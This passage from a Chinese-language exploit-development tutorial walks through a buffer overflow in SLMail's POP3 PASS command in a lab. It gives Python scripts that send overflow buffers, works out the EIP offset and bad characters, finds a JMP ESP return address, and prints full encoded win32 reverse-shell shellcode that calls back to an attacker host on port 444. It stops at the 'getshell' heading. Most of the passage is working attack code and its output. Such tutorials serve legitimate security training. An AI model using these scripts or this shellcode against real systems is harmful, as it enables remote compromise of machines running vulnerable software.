c2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9</span><br></pre></td></tr></table></figure>
<p><strong>将该唯一字符串赋给03.py的 buffer重新执行03.py</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127213117467-869099358.png" /></strong></p>
<p><strong>EIP地址"39694438"对应的ASCII码应为38 44 69
39，即"8Di9"</strong></p>
<p><strong>计算偏移量</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit<span class="comment"># ./pattern_offset.rb -q 39694438 -l 2700</span></span><br><span class="line">[*] Exact match at offset 2606</span><br></pre></td></tr></table></figure>
<p><strong>即覆盖EIP地址前面又2606个字节！</strong></p>
<p><strong>验证(04.py):</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;C&#x27;</span>*<span class="number">20</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127213746337-485181364.png" /></p>
<h4 id="攻击思路">7.3 攻击思路</h4>
<p>• 将 EIP
修改为shellcode代码的内存地址，将Shellcode写入到该地址空间，程序读取EIP
寄存器数值，将跳转到 shellcode 代码段并执行；</p>
<p>• 寻找可存放shellcode的内存空间</p>
<p>手动修改C数值，判断内存空间大小是否能放一下shellcode，假设ESP寄存器可放3500</p>
<p><strong>05.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span>+<span class="string">&#x27;B&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;C&#x27;</span>*(<span class="number">3500</span>-<span class="number">2606</span>+<span class="number">4</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127214749207-334843509.png" /></p>
<p><strong>存放"C"内存空间的起始地址为：0167A154，
终止地址为：0167A2F4，0167A2F4-0167A154=1A0=416字节/字符。</strong></p>
<p>即可存放shellcode的内存空间为416字节，最小的shellcode为300字节左右，因此ESP可以放下一个shellcode。</p>
<h4 id="确定坏字符">7.4 确定坏字符</h4>
<p><strong>•
不同类型的程序、协议、漏洞，会将某些字符认为是坏字符，这些字符有固定用途</strong></p>
<p><strong>• 返回地址、 Shellcode、
buffer中都不能出现坏字符</strong></p>
<p><strong>• null byte (0x00)
空字符，用于终止字符串的拷贝操作</strong></p>
<p><strong>• return (0x0D) 回车操作，表示 POP3
PASS命令输入完成</strong></p>
<p><strong>• 思路：发送 0x00 ---- 0xff
256个字符，查找所有坏字符</strong></p>
<p><strong>06.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars = (</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0b\x0c\x0d\x0e\x0f\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x20&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\4e\x4f\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x60&quot;</span></span><br><span class="line"><span class="string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x70&quot;</span></span><br><span class="line"><span class="string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x80&quot;</span></span><br><span class="line"><span class="string">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xa0&quot;</span></span><br><span class="line"><span class="string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xb0&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xc0&quot;</span></span><br><span class="line"><span class="string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xe0&quot;</span></span><br><span class="line"><span class="string">&quot;\xe1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff\xf0&quot;</span></span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line">buffer = <span class="string">&quot;A&quot;</span>*<span class="number">2606</span> + <span class="string">&quot;B&quot;</span>*<span class="number">4</span> + badchars</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127220043281-977235106.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127220348244-799427020.png" /></p>
<p>本应是0A但实际上是29，可得0A是坏字符，修改0A为某一正常字符（01~09）重新发送继续寻找坏字符。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127220837032-1806737049.png" /></p>
<p>即0D也为坏字符不出现，并缩进了一格。同理可得00也被过滤，最终结果如下图：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127221651176-633888469.png" /></p>
<p><strong>综上，坏字符为：0x00 0x0D 0x0A</strong></p>
<h4 id="重定向数据流">7.5 重定向数据流</h4>
<p><strong>• 用 ESP 的地址替换 EIP 的值</strong></p>
<p><strong>• 但是 ESP 地址变化，硬编码不可行</strong></p>
<p><strong>• SLMail
线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定</strong></p>
<p><strong>• 变通思路</strong></p>
<p><strong>• 在内存中寻找地址固定的系统模块</strong></p>
<p><strong>• 在模块中寻找 JMP ESP 指令的地址跳转，再由该指令间接跳转到
ESP，从而执行shellcode</strong></p>
<p><strong>• mona.py 脚本识别内存模块，搜索"return address"是JMP
ESP指令的模块</strong></p>
<p><strong>• 寻找无DEP、 ALSR保护的内存地址</strong></p>
<p><strong>• 内存地址不包含坏字符</strong></p>
<p><strong>• 寻找不受保护的系统模块</strong></p>
<p><strong>• !mona modules</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127223416174-902353180.png" /></strong></p>
<p><strong>Rebase：系统重启后模块地址是否发生变化；SafeSEH,ASLR,NXCompat都是保护机制，OS
dll
是否在所有系统都运行该模块。因此，选取原则为False，False，False，False，True。</strong></p>
<p>• 在模块中搜索 <strong>jmp esp</strong>指令</p>
<p><strong>• 由于内存中指令以二进制形式存储，所以需要将汇编指令 jmp esp
转换为二进制</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/tools/exploit <span class="comment"># ./nasm_shell.rb </span></span><br><span class="line">nasm &gt; jmp esp</span><br><span class="line">00000000  FFE4              jmp esp</span><br></pre></td></tr></table></figure>
<p><strong>• !mona find -s "" -m xxxx.dll</strong></p>
<p><strong>• 选择不包含坏字符的内存地址</strong></p>
<p><strong>演示：</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127225951423-612847760.png" /></strong></p>
<p><strong>未找到，换下一模块！</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127230210030-1051993760.png" /></p>
<p><strong>双击任意一个指令，在内存数据框中，右键选Disassemble切换为汇编语言显示：</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127230452455-1515380215.png" /></strong></p>
<p>可去memory map中查看详细内容，基地址等。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127232617738-106088257.png" /></p>
<p>因为SLmail本身不支持DEP和ASLR等内存保护机制，所以应该任意一个指令都可以实现跳转。如果有DEP保护，必须寻找到code行Access列中有R，E两个权限（绕过DEP）。</p>
<p>在该地址，通过设置断点，判断其下一步操作，验证是否能实现跳转。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127233011269-843771564.png" /></p>
<p><strong>• 重发 buffer</strong></p>
<p><strong>07.py</strong> （ <strong>注意：地址要翻转</strong> ）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span> + <span class="string">&quot;\x8f\x35\x4a\x5f&quot;</span> + <span class="string">&quot;C&quot;</span> *<span class="number">390</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127235050477-1077276435.png" /></p>
<p><strong>按F7（单步向前执行）</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220127235309995-1828893090.png" /></p>
<h4 id="生成shellcode">7.6 生成shellcode</h4>
<p><strong>（1）payload:</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**root@kali2017:/usr/share/framework2<span class="comment"># ./msfpayload -** **l**</span></span><br><span class="line">Unknown option: l</span><br><span class="line"></span><br><span class="line">   Usage: ./msfpayload &lt;payload&gt; [var=val] &lt;S|C|P|R|X&gt;</span><br><span class="line"></span><br><span class="line">Payloads: </span><br><span class="line">  bsd_ia32_bind                     BSD IA32 Bind Shell</span><br><span class="line">  bsd_ia32_bind_stg                 BSD IA32 Staged Bind Shell</span><br><span class="line">  bsd_ia32_exec                     BSD IA32 Execute Command</span><br><span class="line">  bsd_ia32_findrecv                 BSD IA32 Recv Tag Findsock Shell</span><br><span class="line">  bsd_ia32_findrecv_stg             BSD IA32 Staged Findsock Shell</span><br><span class="line">  bsd_ia32_findsock                 BSD IA32 SrcPort Findsock Shell</span><br><span class="line">  bsd_ia32_reverse                  BSD IA32 Reverse Shell</span><br><span class="line">  bsd_ia32_reverse_stg              BSD IA32 Staged Reverse Shell</span><br><span class="line">  bsd_sparc_bind                    BSD SPARC Bind Shell</span><br><span class="line">  bsd_sparc_reverse                 BSD SPARC Reverse Shell</span><br><span class="line">  bsdi_ia32_bind                    BSDi IA32 Bind Shell</span><br><span class="line">  bsdi_ia32_bind_stg                BSDi IA32 Staged Bind Shell</span><br><span class="line">  bsdi_ia32_findsock                BSDi IA32 SrcPort Findsock Shell</span><br><span class="line">  bsdi_ia32_reverse                 BSDi IA32 Reverse Shell</span><br><span class="line">  bsdi_ia32_reverse_stg             BSDi IA32 Staged Reverse Shell</span><br><span class="line">  cmd_generic                       Arbitrary Command</span><br><span class="line">  cmd_interact                      Unix Interactive Shell</span><br><span class="line">  cmd_irix_bind                     Irix Inetd Bind Shell</span><br><span class="line">  cmd_localshell                    Interactive Local Shell</span><br><span class="line">  cmd_sol_bind                      Solaris Inetd Bind Shell</span><br><span class="line">  cmd_unix_reverse                  Unix Telnet Piping Reverse Shell</span><br><span class="line">  cmd_unix_reverse_bash             Unix /dev/tcp Piping Reverse Shell</span><br><span class="line">  cmd_unix_reverse_nss              Unix Spaceless Telnet Piping Reverse Shell</span><br><span class="line">  generic_sparc_execve              BSD/Linux/Solaris SPARC Execute Shell</span><br><span class="line">  irix_mips_execve                  Irix MIPS Execute Shell</span><br><span class="line">  linux_ia32_adduser                Linux IA32 Add User</span><br><span class="line">  linux_ia32_bind                   Linux IA32 Bind Shell</span><br><span class="line">  linux_ia32_bind_stg               Linux IA32 Staged Bind Shell</span><br><span class="line">  linux_ia32_exec                   Linux IA32 Execute Command</span><br><span class="line">  linux_ia32_findrecv               Linux IA32 Recv Tag Findsock Shell</span><br><span class="line">  linux_ia32_findrecv_stg           Linux IA32 Staged Findsock Shell</span><br><span class="line">  linux_ia32_findsock               Linux IA32 SrcPort Findsock Shell</span><br><span class="line">  linux_ia32_reverse                Linux IA32 Reverse Shell</span><br><span class="line">  linux_ia32_reverse_impurity       Linux IA32 Reverse Impurity Upload/Execute</span><br><span class="line">  linux_ia32_reverse_stg            Linux IA32 Staged Reverse Shell</span><br><span class="line">  linux_ia32_reverse_udp            Linux IA32 Reverse UDP Shell</span><br><span class="line">  linux_sparc_bind                  Linux SPARC Bind Shell</span><br><span class="line">  linux_sparc_findsock              LINUX SPARC SrcPort Find Shell</span><br><span class="line">  linux_sparc_reverse               Linux SPARC Reverse Shell</span><br><span class="line">  osx_ia32_bind                     Mac OS X Intel Bind Shell</span><br><span class="line">  osx_ppc_bind                      Mac OS X PPC Bind Shell</span><br><span class="line">  osx_ppc_bind_stg                  Mac OS X PPC Staged Bind Shell</span><br><span class="line">  osx_ppc_findrecv_stg              Mac OS X PPC Staged Find Recv Shell</span><br><span class="line">  osx_ppc_reverse                   Mac OS X PPC Reverse Shell</span><br><span class="line">  osx_ppc_reverse_nf_stg            Mac OS X PPC Staged Reverse Null-Free Shell</span><br><span class="line">  osx_ppc_reverse_stg               Mac OS X PPC Staged Reverse Shell</span><br><span class="line">  solaris_ia32_bind                 Solaris IA32 Bind Shell</span><br><span class="line">  solaris_ia32_findsock             Solaris IA32 SrcPort Findsock Shell</span><br><span class="line">  solaris_ia32_reverse              Solaris IA32 Reverse Shell</span><br><span class="line">  solaris_sparc_bind                Solaris SPARC Bind Shell</span><br><span class="line">  solaris_sparc_findsock            Solaris SPARC SrcPort Find Shell</span><br><span class="line">  solaris_sparc_reverse             Solaris SPARC Reverse Shell</span><br><span class="line">  win32_adduser                     Windows Execute net user /ADD</span><br><span class="line">  win32_bind                        Windows Bind Shell</span><br><span class="line">  win32_bind_dllinject              Windows Bind DLL Inject</span><br><span class="line">  win32_bind_meterpreter            Windows Bind Meterpreter DLL Inject</span><br><span class="line">  win32_bind_stg                    Windows Staged Bind Shell</span><br><span class="line">  win32_bind_stg_upexec             Windows Staged Bind Upload/Execute</span><br><span class="line">  win32_bind_vncinject              Windows Bind VNC Server DLL Inject</span><br><span class="line">  win32_downloadexec                Windows Executable Download and Execute</span><br><span class="line">  win32_exec                        Windows Execute Command</span><br><span class="line">  win32_findrecv_ord_meterpreter    Windows Recv Tag Findsock Meterpreter</span><br><span class="line">  win32_findrecv_ord_stg            Windows Recv Tag Findsock Shell</span><br><span class="line">  win32_findrecv_ord_vncinject      Windows Recv Tag Findsock VNC Inject</span><br><span class="line">  win32_passivex                    Windows PassiveX ActiveX Injection Payload</span><br><span class="line">  win32_passivex_meterpreter        Windows PassiveX ActiveX Inject Meterpreter Payload</span><br><span class="line">  win32_passivex_stg                Windows Staged PassiveX Shell</span><br><span class="line">  win32_passivex_vncinject          Windows PassiveX ActiveX Inject VNC Server Payload</span><br><span class="line">  win32_reverse                     Windows Reverse Shell</span><br><span class="line">  win32_reverse_dllinject           Windows Reverse DLL Inject</span><br><span class="line">  win32_reverse_meterpreter         Windows Reverse Meterpreter DLL Inject</span><br><span class="line">  win32_reverse_ord                 Windows Staged Reverse Ordinal Shell</span><br><span class="line">  win32_reverse_ord_vncinject       Windows Reverse Ordinal VNC Server Inject</span><br><span class="line">  win32_reverse_stg                 Windows Staged Reverse Shell</span><br><span class="line">  win32_reverse_stg_upexec          Windows Staged Reverse Upload/Execute</span><br><span class="line">  win32_reverse_vncinject           Windows Reverse VNC Server Inject</span><br></pre></td></tr></table></figure>
<p><strong>备注：shellcode 的生成是单独用 kali-2017
生成的，kali-2019中的 msfvenom 使用不熟练生成的 shellcode 总是会超过 500
字节</strong></p>
<p><strong>（2）shellcode
未处理坏字符（LHOST,LPORT均是大写）</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali2017:/usr/share/framework2<span class="comment"># ./msfpayload win32_reverse LHOST=10.10.10.171 LPORT=444 C</span></span><br><span class="line"><span class="string">&quot;\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40&quot;</span></span><br><span class="line"><span class="string">&quot;\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09&quot;</span></span><br><span class="line"><span class="string">&quot;\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x0a\x0a\x0a\xab\x66\x68\x01\xbc\x66\x53\x89\xe1\x95\x68\xec\xf9&quot;</span></span><br><span class="line"><span class="string">&quot;\xaa\x60\x57\xff\xd6\x6a\x10\x51\x55\xff\xd0\x66\x6a\x64\x66\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x63\x6d\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89\xe2\x31\xc0\xf3&quot;</span></span><br><span class="line"><span class="string">&quot;\xaa\x95\x89\xfd\xfe\x42\x2d\xfe\x42\x2c\x8d\x7a\x38\xab\xab\xab&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x72\xfe\xb3\x16\xff\x75\x28\xff\xd6\x5b\x57\x52\x51\x51\x51&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53\xff\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\x6a\xff\xff\x37\xff\xd0\x68\xe7\x79\xc6\x79\xff\x75\x04\xff\xd6&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\x77\xfc\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0&quot;</span>;</span><br></pre></td></tr></table></figure>
<p><strong>（3）shellcode 坏字符处理版</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali2017:/usr/share/framework2<span class="comment"># ./msfpayload win32_reverse LHOST=10.10.10.171 LPORT=444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;    </span></span><br><span class="line">[*] Using Msf::Encoder::PexFnstenvMov with final size of 310 bytes</span><br><span class="line"><span class="string">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xab\x87\xc8&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x31\x83\xeb\xfc\xe2\xf4\x57\xed\x23\x7c\x43\x7e\x37\xce\x54\xe7&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\x5d\x8f\xa3\x43\x74\x97\x0c\xb4\x34\xd3\x86\x27\xba\xe4\x9f&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\x6e\x8b\x86\x23\x78\x20\xb3\x43\x30\x45\xb6\x08\xa8\x07\x03&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x08\x45\xac\x46\x02\x3c\xaa\x45\x23\xc5\x90\xd3\xec\x19\xde\x62&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\x6e\x8f\x86\x23\x57\x20\x8b\x83\xba\xf4\x9b\xc9\xda\xa8\xab&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\xb8\xc7\xa3\xd4\x50\x68\xb6\x13\x55\x20\xc4\xf8\xba\xeb\x8b&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x43\x41\xb7\x2a\x43\x71\xa3\xd9\xa0\xbf\xe5\x89\x24\x61\x54\x51&quot;</span>.</span><br><span class="line"><span class="string">&quot;\xae\x62\xcd\xef\xfb\x03\xc3\xf0\xbb\x03\xf4\xd3\x37\xe1\xc3\x4c&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x25\xcd\x90\xd7\x37\xe7\xf4\x0e\x2d\x57\x2a\x6a\xc0\x33\xfe\xed&quot;</span>.</span><br><span class="line"><span class="string">&quot;\xca\xce\x7b\xef\x11\x38\x5e\x2a\x9f\xce\x7d\xd4\x9b\x62\xf8\xc4&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x9b\x72\xf8\x78\x18\x59\xa1\x8d\xc2\x9a\xcd\xef\xc9\x8d\xcd\xd4&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x41\xd0\x3e\xef\x24\xc8\x01\xe7\x9f\xce\x7d\xed\xd8\x60\xfe\x78&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x18\x57\xc1\xe3\xae\x59\xc8\xea\xa2\x61\xf2\xae\x04\xb8\x4c\xed&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x8c\xb8\x49\xb6\x08\xc2\x01\x12\x41\xcc\x55\xc5\xe5\xcf\xe9\xab&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x45\x4b\x93\x2c\x63\x9a\xc3\xf5\x36\x82\xbd\x78\xbd\x19\x54\x51&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x93\x66\xf9\xd6\x99\x60\xc1\x86\x99\x60\xfe\xd6\x37\xe1\xc3\x2a&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x11\x34\x65\xd4\x37\xe7\xc1\x78\x37\x06\x54\x57\xa0\xd6\xd2\x41&quot;</span>.</span><br><span class="line"><span class="string">&quot;\xb1\xce\xde\x83\x37\xe7\x54\xf0\x34\xce\x7b\xef\x38\xbb\xaf\xd8&quot;</span>.</span><br><span class="line"><span class="string">&quot;\x9b\xce\x7d\x78\x18\x31&quot;</span>;</span><br></pre></td></tr></table></figure>
<h4 id="getshell"><strong>7.7 getshell</strong></h4>
<p><strong>（1）08.py</strong></p>
